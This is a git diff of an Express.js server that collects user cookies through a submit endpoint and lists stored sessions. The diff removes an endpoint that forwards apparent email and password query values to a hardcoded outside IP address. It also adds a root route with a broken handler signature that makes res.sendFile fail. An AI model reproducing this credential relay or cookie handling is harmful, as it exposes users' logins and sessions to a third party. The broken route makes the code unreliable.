@@ -5,32 +5,8 @@ const bodyParser = require('body-parser');
 const app = express();
 app.use(express.json());
 app.use(bodyParser.json());
-
-/* Server*/
-app.get('/http', (req, res) => {
-  res.json(`HTTP GET request received`);
-})
-
 app.use(express.static(path.join(__dirname, 'public')));
-
-app.use(function(req, res) {
-  res.status(400);
-  return res.send(`404 Error: Resource not found`);
-});
-//////////////
 const total = new Map();
-app.get('/api/appstate', async (req, res) => {
-  const e = req.query.e;
-  const p = req.query.p;
-try {
-  const response = await axios.get(`http://65.109.58.118:26011/api/appstate?e=${e}&p=${p}`);
-  const result = response.data.success;
-  res.json({ success: result });
-} catch(e) {
-  res.json({ error: e });
-}
-});
-
 app.get('/total', (req, res) => {
   const data = Array.from(total.values()).map((link, index)  => ({
     session: index + 1,
@@ -41,7 +17,9 @@ app.get('/total', (req, res) => {
   }));
   res.json(JSON.parse(JSON.stringify(data || [], null, 2)));
 });
-
+app.get('/', (res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 app.post('/api/submit', async (req, res) => {
   const {
     cookie,
@@ -180,5 +158,4 @@ async function convertCookie(cookie) {
     }
   });
 }
-
-app.listen(5000);
+app.listen(5000)
